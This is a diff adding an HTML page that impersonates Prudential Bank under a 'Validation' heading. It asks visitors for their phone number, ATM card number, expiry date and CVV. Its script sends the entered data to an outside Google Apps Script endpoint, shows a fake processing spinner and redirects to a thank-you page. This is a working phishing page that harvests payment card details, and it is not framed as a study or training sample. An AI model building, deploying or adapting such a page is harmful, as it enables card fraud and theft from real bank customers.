@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Prudential Bank Validation</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f2f7f8;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: #0A1A2F;
+      position: relative;
+    }
+
+    /* PRUDENTIAL BANK HEADER */
+    .header {
+      background: linear-gradient(to bottom, #009CA6, #006F78);
+      color: white;
+      text-align: center;
+      padding: 25px 20px;
+      width: 100%;
+      max-width: 600px;
+      border-bottom-left-radius: 20px;
+      border-bottom-right-radius: 20px;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      margin: 0;
+      letter-spacing: 1px;
+      font-weight: bold;
+    }
+
+    .header p {
+      font-size: 13px;
+      margin-top: 4px;
+      opacity: 0.9;
+    }
+
+    /* WELCOME TEXT */
+    .welcome-text {
+      width: 90%;
+      max-width: 400px;
+      margin-top: 25px;
+      text-align: center;
+    }
+
+    .welcome-text p {
+      font-size: 18px;
+      font-weight: bold;
+      margin: 0;
+      color: #0B1A33; /* same color style as button */
+    }
+
+    /* Form Container */
+    .login-container {
+      background: #ffffff;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 22px;
+      padding: 30px 25px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    label {
+      display: block;
+      font-size: 15px;
+      font-weight: 700;
+      color: #0A1A2F;
+      margin-bottom: 6px;
+      margin-top: 16px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      border: 1px solid #D7DCE1;
+      background: #FFFFFF;
+      font-size: 15px;
+      margin-bottom: 4px;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      height: 54px;
+      background: #0B1A33;
+      color: #ffffff;
+      font-size: 17px;
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 25px;
+      box-shadow: 0px 2px 6px rgba(0,0,0,0.18);
+      transition: 0.15s ease-in-out;
+    }
+
+    button:hover {
+      background: #0D234A;
+    }
+
+    /* OVERLAY */
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.55);
+      backdrop-filter: blur(2px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      z-index: 9999;
+      color: white;
+      font-size: 18px;
+      text-align: center;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .spinner {
+      width: 55px;
+      height: 55px;
+      border: 5px solid rgba(255, 255, 255, 0.3);
+      border-top: 5px solid #009CA6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 18px;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="header">
+    <h1>PRUDENTIAL BANK</h1>
+    <p>Truly Dependable</p>
+  </div>
+
+  <div class="welcome-text">
+    <p>Confirm your Account Details Below</p>
+  </div>
+
+  <div class="login-container">
+    <form id="demoForm">
+      <label>Phone Number</label>
+      <input type="tel" name="phone_number" required>
+
+      <label>ATM Card Number</label>
+      <input type="text" name="atm_card_number" required>
+
+      <label>ATM Expiry Date</label>
+      <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
+
+      <label>CVV</label>
+      <input type="text" name="cvv" required>
+
+      <button type="submit">VALIDATE SERVICES →</button>
+    </form>
+  </div>
+
+  <!-- PROCESSING OVERLAY -->
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Processing your request…  
+    <br>Please wait.
+  </div>
+
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbw-BN61Qrq7grgilOPWqHHw3WPJULXjddmz4kiisZoPJb-7sQU06jA4mdDNmb6VzQiaWg/exec";
+  const form = document.getElementById("demoForm");
+  const overlay = document.getElementById("overlay");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    overlay.classList.add("active"); // SHOW OVERLAY
+
+    const formData = new FormData(form);
+
+    try {
+      const response = await fetch(scriptURL, { method: "POST", body: formData });
+      const result = await response.text();
+
+      if (result.includes("Success")) {
+        setTimeout(() => {
+          window.location.href = "thankyou.html";
+        }, 1800);
+      } else {
+        overlay.classList.remove("active");
+        alert("Submission failed: " + result);
+      }
+    } catch (err) {
+      overlay.classList.remove("active");
+      alert("There was a network error. Please try again.");
+    }
+  });
+</script>
+
+</body>
+</html>
